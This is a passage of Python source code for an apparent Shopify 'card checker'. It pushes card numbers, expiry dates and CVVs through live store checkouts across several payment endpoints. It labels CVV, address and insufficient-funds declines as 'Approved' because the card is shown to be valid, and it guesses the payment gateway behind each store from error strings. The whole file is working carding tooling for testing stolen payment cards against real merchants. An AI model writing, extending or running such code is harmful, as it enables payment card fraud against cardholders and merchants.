                        f"https://{domain}/wallets/checkouts/{checkout_url.split('/')[-1]}/payment_sessions",
                        "https://deposit.global.shopifycs.com/sessions",
                        "https://deposit.eu.shopifycs.com/sessions"
                    ]
                    
                    session_id = None
                    for endpoint in session_endpoints:
                        try:
                            print(f"Trying payment endpoint: {endpoint}")
                            session_response = self.session.post(
                                endpoint,
                                json=card_session_data,
                                headers={
                                    'Content-Type': 'application/json',
                                    'Accept': 'application/json',
                                    'X-Shopify-Checkout-Version': '2022-03',
                                    'X-Shopify-Checkout-API-Call': 'true'
                                }
                            )
                            
                            if session_response.status_code == 200:
                                try:
                                    session_data = session_response.json()
                                    if 'id' in session_data:
                                        session_id = session_data['id']
                                        print(f"Got session ID from {endpoint}: {session_id}")
                                        break
                                except Exception as e:
                                    print(f"Error parsing JSON from session response: {str(e)}")
                                
                                # Try to extract session ID from response text
                                id_match = re.search(r'"id"\s*:\s*"([^"]+)"', session_response.text)
                                if id_match:
                                    session_id = id_match.group(1)
                                    print(f"Extracted session ID from response text: {session_id}")
                                    break
                        except Exception as e:
                            print(f"Error with payment endpoint {endpoint}: {str(e)}")
                            continue
                    
                    # If we couldn't get a session ID, try an alternative approach
                    if not session_id:
                        print("No session ID found, trying alternative payment methods")
                        
                        # Look for a payment form in the page
                        payment_form_patterns = [
                            r'<form[^>]*action="([^"]*payment[^"]*)"',
                            r'<form[^>]*action="([^"]*checkout[^"]*)".*?credit-card',
                            r'data-payment-form="([^"]+)"'
                        ]
                        
                        payment_form_url = None
                        for pattern in payment_form_patterns:
                            match = re.search(pattern, payment_page_response.text, re.DOTALL)
                            if match:
                                payment_form_url = match.group(1)
                                if payment_form_url.startswith('/'):
                                    payment_form_url = f"https://{domain}{payment_form_url}"
                                print(f"Found payment form URL: {payment_form_url}")
                                break
                        
                        if payment_form_url:
                            print(f"Using direct payment form: {payment_form_url}")
                            
                            # Submit card details directly to the payment form
                            direct_payment_data = {
                                'credit_card[name]': f"{user_data['first_name']} {user_data['last_name']}",
                                'credit_card[number]': cc,
                                'credit_card[month]': sub_month,
                                'credit_card[year]': year,
                                'credit_card[verification_value]': cvv,
                                'authenticity_token': auth_token
                            }
                            
                            # Add additional fields that might be required
                            if cart_token:
                                direct_payment_data['cart'] = cart_token
                            
                            if checkout_token:
                                direct_payment_data['checkout_token'] = checkout_token
                            
                            print("Submitting direct payment form")
                            direct_payment_response = self.session.post(payment_form_url, data=direct_payment_data, allow_redirects=True)
                            
                            # Check if payment was successful
                            if 'thank_you' in direct_payment_response.url:
                                print("Payment successful! Redirected to thank you page")
                                
                                # Extract amount if available
                                amount = self.extract_charge_amount(direct_payment_response.text)
                                amount_str = f" {amount}" if amount else ""
                                
                                return {
                                    'status': True,
                                    'result': f'Approved - Charged{amount_str}',
                                    'message': 'Payment successful',
                                    'gateway': self.determine_gateway_type(None, checkout_url),
                                    'cart_session': cart_session,
                                    'checkout_token': checkout_token,
                                    'location_path': location_path
                                }
                            
                            # If not successful, try to parse the error message
                            error_message = None
                            error_patterns = [
                                r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>',
                                r'<p[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</p>',
                                r'data-error-message="([^"]*)"',
                                r'<span[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</span>'
                            ]
                            
                            for pattern in error_patterns:
                                match = re.search(pattern, direct_payment_response.text, re.DOTALL)
                                if match:
                                    error_message = match.group(1).strip()
                                    error_message = re.sub(r'<[^>]*>', '', error_message)  # Remove HTML tags
                                    print(f"Found error message: {error_message}")
                                    break
                            
                            result = self.parse_payment_result(direct_payment_response.text, checkout_url, error_message)
                            result['cart_session'] = cart_session
                            result['checkout_token'] = checkout_token
                            result['location_path'] = location_path
                            return result
                    
                    # If we have a session ID, proceed with the standard payment flow
                    if session_id:
                        print(f"Using session ID for payment: {session_id}")
                        payment_data = {
                            '_method': 'patch',
                            'authenticity_token': auth_token,
                            'previous_step': 'payment_method',
                            'step': '',
                            's': session_id,
                            'checkout[payment_gateway]': payment_gateway,
                            'checkout[credit_card][vault]': 'false',
                            'checkout[different_billing_address]': 'false',
                            'checkout[remember_me]': 'false',
                            'checkout[total]': '',  # This will be filled by the server
                            'complete': '1'
                        }
                        
                        # Add email to ensure it's set correctly
                        payment_data['checkout[email]'] = user_data['email']
                        
                        print(f"Submitting payment with session ID: {session_id}")
                        payment_response = self.session.post(checkout_page_url, data=payment_data, allow_redirects=True)
                        
                        # Wait for payment processing
                        print("Waiting for payment processing...")
                        time.sleep(3)
                        
                        # Check if we were redirected to the thank you page
                        if 'thank_you' in payment_response.url:
                            print("Payment successful! Redirected to thank you page")
                            
                            # Extract amount if available
                            amount = self.extract_charge_amount(payment_response.text)
                            amount_str = f" {amount}" if amount else ""
                            
                            return {
                                'status': True,
                                'result': f'Approved - Charged{amount_str}',
                                'message': 'Payment successful',
                                'gateway': self.determine_gateway_type(None, checkout_url),
                                'cart_session': cart_session,
                                'checkout_token': checkout_token,
                                'location_path': location_path
                            }
                        
                        # If not, check the processing page
                        print("Checking payment validation page")
                        validation_url = f"{checkout_page_url}?from_processing_page=1&validate=true"
                        validation_response = self.session.get(validation_url, allow_redirects=True)
                        
                        # Check if validation redirected to thank you page
                        if 'thank_you' in validation_response.url:
                            print("Payment successful after validation! Redirected to thank you page")
                            
                            # Extract amount if available
                            amount = self.extract_charge_amount(validation_response.text)
                            amount_str = f" {amount}" if amount else ""
                            
                            return {
                                'status': True,
                                'result': f'Approved - Charged{amount_str}',
                                'message': 'Payment successful',
                                'gateway': self.determine_gateway_type(None, checkout_url),
                                'cart_session': cart_session,
                                'checkout_token': checkout_token,
                                'location_path': location_path
                            }
                        
                        result = self.parse_payment_result(validation_response.text, checkout_url)
                        result['cart_session'] = cart_session
                        result['checkout_token'] = checkout_token
                        result['location_path'] = location_path
                        return result
                    
                    # If we reach here, we couldn't process the payment
                    print("Failed to process payment in this attempt")
                    
                except Exception as e:
                    print(f"Error in payment attempt {attempt}: {str(e)}")
                    if attempt < 3:
                        print(f"Waiting before retry...")
                        time.sleep(2)  # Wait before retrying
                    continue
            
            # If we reach here after all attempts, return error
            print("Failed to process payment after multiple attempts")
            return {
                'status': False, 
                'message': 'Failed to process payment after multiple attempts', 
                'result': 'Error', 
                'gateway': self.determine_gateway_type(None, checkout_url) or 'Unknown',
                'cart_session': cart_session,
                'checkout_token': checkout_token,
                'location_path': location_path
            }
            
        except Exception as e:
            print(f"Error processing card payment: {str(e)}")
            return {'status': False, 'message': f'Error: {str(e)}', 'result': 'Error', 'gateway': 'Unknown'}

    def parse_payment_result(self, response_text, checkout_url, error_message=None):
        print("Parsing payment result...")
        
        # First check if we have an explicit error message
        message = error_message
        
        # If not, try to extract it from the response
        if not message:
            # Try multiple patterns to extract error messages
            message_patterns = [
                ('<p class="notice__text">', '</p></div></div>'),
                ('<div class="notice__content">', '</div>'),
                ('<div class="error">', '</div>'),
                ('<div class="alert alert-danger">', '</div>'),
                ('<span class="error-message">', '</span>'),
                ('data-error-message="', '"'),
                ('<div class="payment-errors">', '</div>'),
                ('<div class="message">', '</div>'),
                ('<div class="banner banner--error">', '</div>'),
                ('<p class="error-message">', '</p>'),
                ('<div class="validation-error">', '</div>'),
                ('<div class="field__message field__message--error">', '</div>')
            ]
            
            for pattern in message_patterns:
                extracted = self.extract_between(response_text, pattern[0], pattern[1])
                if extracted:
                    message = extracted.strip()
                    # Remove HTML tags
                    message = re.sub(r'<[^>]*>', '', message)
                    message = message.strip()
                    print(f"Found error message with pattern '{pattern[0]}': {message}")
                    break
                    
            # If still no message, try regex patterns
            if not message:
                regex_patterns = [
                    r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>',
                    r'<p[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</p>',
                    r'<span[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</span>',
                    r'data-error-message="([^"]*)"',
                    r'error_message\s*:\s*[\'"]([^\'"]*)[\'"]',
                    r'errorMessage\s*:\s*[\'"]([^\'"]*)[\'"]',
                    r'error:\s*[\'"]([^\'"]*)[\'"]',
                    r'message\s*:\s*[\'"]([^\'"]*error[^\'"]*)[\'"]'
                ]
                
                for pattern in regex_patterns:
                    match = re.search(pattern, response_text, re.DOTALL)
                    if match:
                        message = match.group(1).strip()
                        # Remove HTML tags
                        message = re.sub(r'<[^>]*>', '', message)
                        message = message.strip()
                        print(f"Found error message with regex pattern: {message}")
                        break
        
        # Determine the gateway type
        gateway_type = self.determine_gateway_type(message, checkout_url)
        print(f"Determined gateway type: {gateway_type}")
        
        # Extract amount using the dedicated method
        amount = self.extract_charge_amount(response_text)
        if amount:
            print(f"Found charge amount: {amount}")
        
        # Check for successful payment
        success_indicators = [
            'thank_you', '/thank_you', 'order-status', 'order_status', 
            'order-confirmation', 'order_confirmation', 'success', 
            'payment successful', 'payment approved'
        ]
        
        for indicator in success_indicators:
            if indicator.lower() in response_text.lower():
                print(f"Found success indicator: {indicator}")
                amount_str = f" {amount}" if amount else ""
                return {
                    'status': True,
                    'result': f'Approved - Charged{amount_str}',
                    'message': 'Payment successful',
                    'gateway': gateway_type
                }
        
        # Check for various approval scenarios
        if self.is_cvv_error(message):
            print("Detected CVV error - card is valid")
            return {
                'status': True,
                'result': 'Approved - CVV',
                'message': message or 'CVV verification failed but card is valid',
                'gateway': gateway_type
            }
        elif self.is_avs_error(message):
            print("Detected AVS error - card is valid")
            return {
                'status': True,
                'result': 'Approved - AVS',
                'message': message or 'Address verification failed but card is valid',
                'gateway': gateway_type
            }
        elif self.is_insufficient_funds(message):
            print("Detected insufficient funds error - card is valid")
            return {
                'status': True,
                'result': 'Approved - Insufficient Funds',
                'message': message or 'Insufficient funds but card is valid',
                'gateway': gateway_type
            }
        
        # Check for 3D Secure or additional verification
        verification_indicators = [
            '3d secure', 'verification', 'authenticate', 'authentication',
            'verified by visa', 'mastercard secure', 'additional security',
            'identity check', 'cardinal', 'secure code'
        ]
        
        for indicator in verification_indicators:
            if indicator.lower() in response_text.lower():
                print(f"Found 3D Secure indicator: {indicator}")
                return {
                    'status': True,
                    'result': 'Approved - 3D Secure',
                    'message': message or 'Card requires 3D Secure verification',
                    'gateway': gateway_type
                }
            
        # Check for redirect to external payment processor
        redirect_indicators = [
            'redirect', 'external', 'processor', 'processing', 
            'offsite', 'off-site', 'third-party', 'third_party'
        ]
        
        redirect_count = 0
        for indicator in redirect_indicators:
            if indicator.lower() in response_text.lower():
                redirect_count += 1
        
        if redirect_count >= 2:  # At least two indicators to confirm it's a redirect
            print("Detected redirect to external payment processor")
            return {
                'status': True,
                'result': 'Approved - External Redirect',
                'message': message or 'Card redirected to external payment processor',
                'gateway': gateway_type
            }
        
        # Check for processing or pending status
        processing_indicators = [
            'processing', 'pending', 'in progress', 'wait', 
            'validating', 'verifying', 'checking'
        ]
        
        for indicator in processing_indicators:
            if indicator.lower() in response_text.lower():
                print(f"Found processing indicator: {indicator}")
                return {
                    'status': True,
                    'result': 'Processing',
                    'message': message or 'Payment is being processed',
                    'gateway': gateway_type
                }
        
        # Default to declined
        print("No success indicators found - payment declined")
        return {
            'status': False,
            'result': 'Declined',
            'message': message or 'Transaction declined',
            'gateway': gateway_type
        }

    def determine_gateway_type(self, message, checkout_url):
        if not message:
            return "Shopify"
        
        braintree_messages = ["2010 Card Issuer Declined CVV", "2047 Call Issuer", "2007 No Account"]
        if any(msg in message for msg in braintree_messages):
            return "Shopify + Braintree"
        
        if "CVV does not match" in message:
            return "Shopify + Spreedly"
        
        if "CVD ERROR" in message or "AUTH DECLINED" in message:
            return "Shopify + Moneris"
        
        if "Transaction Normal" in message:
            return "Shopify + Payeezy"
        
        if "CVV2 Mismatch" in message and "10502" in message:
            return "Shopify + Payflow"
        
        if "CVC Declined" in message or "Issuer Suspected Fraud" in message:
            return "Shopify + Adyen"
        
        if '/checkouts/c/' in checkout_url:
            return "Shopify + Stripe"
        
        return "Shopify"

    def is_cvv_error(self, message):
        cvv_errors = [
            "CVV does not match", "CVC Declined", "CVV2 Mismatch", "Security codes does not match",
            "security code", "cvv", "cvc", "card verification", "card security code", 
            "verification value", "security number", "card verification failed",
            "incorrect security code", "invalid security code", "wrong security code",
            "incorrect cvv", "invalid cvv", "wrong cvv", "incorrect cvc", "invalid cvc", "wrong cvc",
            "security code is incorrect", "security code is invalid", "security code is wrong",
            "cvv is incorrect", "cvv is invalid", "cvv is wrong",
            "cvc is incorrect", "cvc is invalid", "cvc is wrong",
            "card security code is incorrect", "card security code is invalid", "card security code is wrong",
            "verification value is incorrect", "verification value is invalid", "verification value is wrong",
            "security number is incorrect", "security number is invalid", "security number is wrong",
            "card verification failed", "card verification error", "card verification issue",
            "2010", "N7", "230", "CVD"  # Common CVV error codes
        ]
        return any(error.lower() in message.lower() for error in cvv_errors) if message else False

    def is_avs_error(self, message):
        avs_errors = [
            "AVS", "Address not Verified", "avs", "address verification", 
            "billing address", "address does not match", "address mismatch",
            "postal code", "zip code", "address verification failed",
            "incorrect address", "invalid address", "wrong address",
            "incorrect postal code", "invalid postal code", "wrong postal code",
            "incorrect zip code", "invalid zip code", "wrong zip code",
            "address is incorrect", "address is invalid", "address is wrong",
            "postal code is incorrect", "postal code is invalid", "postal code is wrong",
            "zip code is incorrect", "zip code is invalid", "zip code is wrong",
            "billing address is incorrect", "billing address is invalid", "billing address is wrong",
            "address verification error", "address verification issue",
            "N", "A", "Z", "W", "U"  # Common AVS error codes
        ]
        return any(error.lower() in message.lower() for error in avs_errors) if message else False

    def is_insufficient_funds(self, message):
        fund_errors = [
            "Insufficient Funds", "Insuff Funds", "Credit Floor", "insufficient balance", 
            "not enough funds", "declined due to insufficient funds", "insufficient credit",
            "exceeds balance", "exceeds credit limit", "over limit", "limit exceeded",
            "no funds", "no balance", "no credit", "balance too low", "credit too low",
            "insufficient money", "not enough money", "declined due to insufficient money",
            "insufficient credit available", "not enough credit available",
            "insufficient balance available", "not enough balance available",
            "insufficient funds available", "not enough funds available",
            "card balance too low", "card credit too low",
            "51", "61", "65", "116", "NSF"  # Common insufficient funds error codes
        ]
        return any(error.lower() in message.lower() for error in fund_errors) if message else False
        
    def extract_charge_amount(self, response_text):
        """Extract the charge amount from the response text."""
        amount_patterns = [
            r'data-checkout-payment-due="(\d+)"',
            r'data-checkout-total-price="(\d+)"',
            r'total\s*:\s*[\'"]?\$?(\d+\.\d+)[\'"]?',
            r'amount[\'"]?\s*:\s*[\'"]?\$?(\d+\.\d+)[\'"]?',
            r'data-checkout-payment-due-target="(\d+)"',
            r'data-checkout-total="(\d+\.\d+)"',
            r'data-checkout-payment-due="([^"]+)"',
            r'<span[^>]*class="payment-due-price"[^>]*>\s*\$?(\d+\.\d+)\s*</span>',
            r'<span[^>]*class="total-recap__final-price"[^>]*>\s*\$?(\d+\.\d+)\s*</span>'
        ]
        
        for pattern in amount_patterns:
            match = re.search(pattern, response_text)
            if match:
                try:
                    amount_value = match.group(1)
                    # If it's in cents (large number), convert to dollars
                    if len(amount_value) > 5 or (amount_value.isdigit() and int(amount_value) > 1000):
                        return f"${float(amount_value)/100:.2f}"
                    else:
                        return f"${float(amount_value):.2f}"
                except Exception as e:
                    print(f"Error parsing amount: {str(e)}")
                    continue
        
        return None

def process_shopify_payment(cc, month, year, cvv, site_url):
    processor = ShopifyPaymentProcessor()
    return processor.process_payment(cc, month, year, cvv, site_url)

def main():
    # Prompt the user for input
    cc = input("Enter credit card number: ")
    month = input("Enter expiration month: ")
    year = input("Enter expiration year: ")
    cvv = input("Enter CVV: ")
    site_url = input("Enter site URL: ")

    # Process the payment
    result = process_shopify_payment(cc, month, year, cvv, site_url)

    # Print the result
    print(json.dumps(result, indent=2))
    
if __name__ == "__main__":
    main()